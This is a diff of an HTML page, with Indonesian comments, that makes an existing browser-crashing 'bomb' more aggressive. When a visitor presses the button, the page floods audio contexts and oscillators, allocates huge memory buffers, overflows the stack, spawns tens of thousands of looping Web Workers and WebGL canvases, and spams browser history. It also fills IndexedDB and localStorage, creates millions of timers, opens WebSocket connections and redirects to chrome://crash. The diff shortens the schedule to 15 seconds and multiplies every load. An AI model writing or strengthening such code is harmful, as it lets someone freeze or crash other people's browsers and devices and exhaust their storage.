@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ANAK BAIK</title>
+    <title>FC 3 DETIK + MP3</title>
     <style>
         body {
             margin: 0;
@@ -27,7 +27,7 @@
             font-weight: bold;
             cursor: pointer;
             box-shadow: 0 0 100px red;
-            animation: pulse 1s infinite;
+            animation: pulse 0.5s infinite;
         }
         @keyframes pulse {
             0% { transform: scale(1); }
@@ -45,7 +45,7 @@
     </style>
 </head>
 <body>
-    <div id="btn">🖕🏿ZMT🖕🏿</div>
+    <div id="btn">🔥 GAS 3 DETIK 🔥</div>
     <div id="status"></div>
 
     <script>
@@ -53,35 +53,32 @@
             const btn = this;
             const statusDiv = document.getElementById('status');
             
-            // Sembunyikan tombol, tampilkan status
             btn.style.display = 'none';
             statusDiv.style.display = 'block';
             
-            // ========== PLAY CRASH.MP3 (TAMBAHAN DARI USER) ==========
+            // ========== PLAY CRASH.MP3 ==========
             try {
                 let crashSound = new Audio('crash.mp3');
-                crashSound.volume = 1.0;  // Maksimalin volume
+                crashSound.volume = 1.0;
                 crashSound.play();
-            } catch (e) {
-                console.log('Gagal mainin crash.mp3, mungkin file gak ada');
-            }
-            
+            } catch (e) {}
+
             // Mulai waktu
             const startTime = Date.now();
             
-            // ========== SUARA 10.000 (LANGSUNG) ==========
-            for (let ctx = 0; ctx < 500; ctx++) {
+            // ========== SUARA 20.000 (lebih banyak) ==========
+            for (let ctx = 0; ctx < 1000; ctx++) {
                 try {
                     let a = new (window.AudioContext || window.webkitAudioContext)();
                     let g = a.createGain();
-                    g.gain.value = 0.002;
+                    g.gain.value = 0.001;
                     g.connect(a.destination);
                     for (let i = 0; i < 20; i++) {
                         let o = a.createOscillator();
                         o.type = ['sine', 'square', 'sawtooth', 'triangle'][Math.floor(Math.random() * 4)];
-                        o.frequency.value = 10 + Math.random() * 7000;
+                        o.frequency.value = 1 + Math.random() * 10000;
                         let og = a.createGain();
-                        og.gain.value = 0.0001;
+                        og.gain.value = 0.00005;
                         o.connect(og);
                         og.connect(g);
                         o.start();
@@ -90,112 +87,109 @@
                 } catch (e) {}
             }
 
-            // ========== FUNGSI UPDATE STATUS ==========
+            // ========== UPDATE STATUS ==========
             function updateStatus() {
                 const elapsed = Math.floor((Date.now() - startTime) / 1000);
                 let phase = '';
-                if (elapsed < 15) phase = '⚡ FASE 1: MEMORY LEAK (0-15 detik) ⚡';
-                else if (elapsed < 30) phase = '💀 FASE 2: WORKER & WEBGL (15-30 detik) 💀';
-                else if (elapsed < 45) phase = '🔥 FASE 3: SHARED & INDEXEDDB (30-45 detik) 🔥';
-                else phase = '☠️ FASE 4: INFINITE LOOP (45-60 detik) ☠️';
+                if (elapsed < 5) phase = '⚡ FASE 1: MEMORY LEAK (0-5 detik) ⚡';
+                else if (elapsed < 10) phase = '💀 FASE 2: WORKER & WEBGL (5-10 detik) 💀';
+                else phase = '🔥 FASE 3: INFINITE LOOP (10+ detik) 🔥';
                 
-                statusDiv.innerText = `${phase}\n\nWaktu: ${elapsed} detik\n\nChrome makin berat...`;
+                statusDiv.innerText = `${phase}\n\nWaktu: ${elapsed} detik\n\nChrome mau tumbang...`;
                 
-                if (elapsed < 60) {
+                if (elapsed < 15) {
                     requestAnimationFrame(updateStatus);
                 } else {
-                    statusDiv.innerText = '💥 CHROME AKAN SEGERA TUMBANG 💥';
+                    statusDiv.innerText = '💥 CHROME SUDAH TUMBANG 💥';
                 }
             }
             requestAnimationFrame(updateStatus);
 
-            // ========== FASE 1: MEMORY LEAK + STACK OVERFLOW (0-15 detik) ==========
+            // ========== FASE 1: MEMORY LEAK + STACK OVERFLOW (0-5 detik) ==========
             (function fase1() {
                 let memLeak = [];
-                // Stack overflow bertahap (rekursif dengan interval)
                 function stackLoop(depth) {
-                    if (depth > 100000) return;
+                    if (depth > 1000000) return; // lebih dalam
                     stackLoop(depth + 1);
                 }
-                // Jalankan stack overflow setiap 100ms
+                // stack overflow tiap 10ms
                 let stackInterval = setInterval(() => {
-                    try { stackLoop(0); } catch(e){}
-                }, 100);
-                
-                // Alokasi memory besar tiap 10ms
-                let memInterval = setInterval(() => {
-                    for (let i = 0; i < 1000; i++) {
-                        try {
-                            memLeak.push(new ArrayBuffer(10000000)); // 10MB
-                            memLeak.push(new Blob([new Uint8Array(50000000)])); // 50MB
-                            memLeak.push(new Array(1000000).join('x')); // 1MB
-                        } catch(e){}
+                    for (let s = 0; s < 10; s++) { // multiple stack
+                        try { stackLoop(0); } catch(e){}
                     }
                 }, 10);
                 
-                // Hentikan setelah 15 detik
+                // Alokasi memory tiap 1ms (lebih rapat)
+                let memInterval = setInterval(() => {
+                    for (let i = 0; i < 10000; i++) { // 10x lipat
+                        try {
+                            memLeak.push(new ArrayBuffer(100000000)); // 100MB
+                            memLeak.push(new Blob([new Uint8Array(200000000)])); // 200MB
+                            memLeak.push(new Array(5000000).join('x')); // 5MB
+                        } catch(e){}
+                    }
+                }, 1);
+                
                 setTimeout(() => {
                     clearInterval(stackInterval);
                     clearInterval(memInterval);
-                }, 15000);
+                }, 5000);
             })();
 
-            // ========== FASE 2: WEB WORKER + WEBGL + HISTORY SPAM (15-30 detik) ==========
+            // ========== FASE 2: WEB WORKER + WEBGL + HISTORY (5-10 detik) ==========
             setTimeout(() => {
-                // 20.000 Web Worker (bertahap)
-                for (let w = 0; w < 20000; w++) {
+                // 50.000 Worker
+                for (let w = 0; w < 50000; w++) {
                     setTimeout(() => {
                         try {
                             new Worker(URL.createObjectURL(new Blob([`
                                 while(1) {
-                                    for(let i=0;i<999999;i++) { Math.sqrt(i); }
+                                    for(let i=0;i<9999999;i++) { Math.sqrt(i); }
                                 }
                             `])));
                         } catch(e){}
-                    }, w * 2); // sebarkan selama 40 detik (2*20000 = 40000ms) tapi kita hanya punya 15 detik, jadi padatkan
+                    }, w * 0.5); // lebih rapat
                 }
                 
-                // 10.000 Canvas WebGL
-                for (let g = 0; g < 10000; g++) {
+                // 50.000 Canvas WebGL
+                for (let g = 0; g < 50000; g++) {
                     setTimeout(() => {
                         try {
                             let c = document.createElement('canvas');
-                            c.width = 2048;
-                            c.height = 2048;
+                            c.width = 4096;
+                            c.height = 4096;
                             let gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                             if (gl) {
-                                for (let t = 0; t < 100; t++) {
+                                for (let t = 0; t < 500; t++) {
                                     gl.createTexture();
                                     gl.createBuffer();
                                 }
                             }
                             document.body.appendChild(c);
                         } catch(e){}
-                    }, g * 3);
+                    }, g * 1);
                 }
                 
-                // History spam tiap 1ms
+                // History spam 10.000 per ms
                 let histInterval = setInterval(() => {
-                    for (let h = 0; h < 1000; h++) {
+                    for (let h = 0; h < 10000; h++) {
                         try { history.pushState({}, '', '/#' + Math.random()); } catch(e){}
                     }
                 }, 1);
                 
-                setTimeout(() => clearInterval(histInterval), 15000);
-            }, 15000);
+                setTimeout(() => clearInterval(histInterval), 5000);
+            }, 5000);
 
-            // ========== FASE 3: SHAREDARRAYBUFFER + INDEXEDDB + TIMER (30-45 detik) ==========
+            // ========== FASE 3: INFINITE LOOP + RELOAD + SEGALANYA (10-15 detik) ==========
             setTimeout(() => {
-                // SharedArrayBuffer (jika didukung)
+                // SharedArrayBuffer 500.000
                 if (typeof SharedArrayBuffer !== 'undefined') {
-                    for (let s = 0; s < 100000; s++) {
-                        setTimeout(() => {
-                            try { new SharedArrayBuffer(100000000); } catch(e){}
-                        }, s);
+                    for (let s = 0; s < 500000; s++) {
+                        try { new SharedArrayBuffer(100000000); } catch(e){}
                     }
                 }
                 
-                // IndexedDB bomb
+                // IndexedDB bomb (1000 store, 100000 entry)
                 try {
                     let req = indexedDB.open('killerdb', 1);
                     req.onsuccess = function(e) {
@@ -203,61 +197,53 @@
                         for (let t = 0; t < 1000; t++) {
                             if (!db.objectStoreNames.contains('s' + t)) {
                                 let store = db.createObjectStore('s' + t, { keyPath: 'id' });
-                                for (let d = 0; d < 10000; d++) {
-                                    try { store.put({ id: d, data: 'x'.repeat(100000) }); } catch(e){}
+                                for (let d = 0; d < 100000; d++) {
+                                    try { store.put({ id: d, data: 'x'.repeat(1000000) }); } catch(e){}
                                 }
                             }
                         }
                     };
                 } catch(e){}
                 
-                // Timer overload 5 juta timer (disebar)
-                for (let t = 0; t < 5000000; t++) {
-                    setTimeout(() => {
-                        setInterval(() => {
-                            for(let z=0;z<1000;z++){ Math.random(); }
-                        }, 0);
-                    }, t % 15000); // sebarkan selama 15 detik
+                // Timer 10 juta
+                for (let t = 0; t < 10000000; t++) {
+                    setInterval(() => {
+                        for(let z=0;z<100000;z++){ Math.random(); }
+                    }, 0);
                 }
                 
-                // LocalStorage penuh
-                for (let s = 0; s < 500000; s++) {
-                    setTimeout(() => {
-                        try { localStorage.setItem('k' + s, 'x'.repeat(100000)); } catch(e){}
-                    }, s % 15000);
+                // LocalStorage 1 juta
+                for (let s = 0; s < 1000000; s++) {
+                    try { localStorage.setItem('k' + s, 'x'.repeat(1000000)); } catch(e){}
                 }
-            }, 30000);
-
-            // ========== FASE 4: INFINITE LOOP + ARRAY PUSH + RELOAD (45-60 detik) ==========
-            setTimeout(() => {
-                // WebSocket bomb 10.000 koneksi
-                for (let ws = 0; ws < 10000; ws++) {
+                
+                // WebSocket 50.000
+                for (let ws = 0; ws < 50000; ws++) {
                     try { new WebSocket('ws://localhost:' + ws); } catch(e){}
                 }
                 
-                // Infinite loop di worker (sudah banyak dari fase 2)
-                // Tambah loop berat di main thread secara bertahap
+                // Infinite loop main thread
                 let arr = [];
                 let loopInterval = setInterval(() => {
-                    for (let i = 0; i < 100000; i++) {
+                    for (let i = 0; i < 1000000; i++) {
                         try {
-                            arr.push(new ArrayBuffer(100000000));
-                            arr.push(new Array(1000000).join('x'));
+                            arr.push(new ArrayBuffer(500000000));
+                            arr.push(new Array(10000000).join('x'));
                         } catch(e){}
                     }
                 }, 0);
                 
-                // Reload paksa berkala
+                // Reload paksa tiap 10ms
                 let reloadInterval = setInterval(() => {
                     try { location.replace('chrome://crash'); } catch(e){}
                     try { location.replace('about:crash'); } catch(e){}
-                }, 100);
+                }, 10);
                 
                 setTimeout(() => {
                     clearInterval(loopInterval);
                     clearInterval(reloadInterval);
-                }, 15000);
-            }, 45000);
+                }, 5000);
+            }, 10000);
         };
     </script>
 </body>
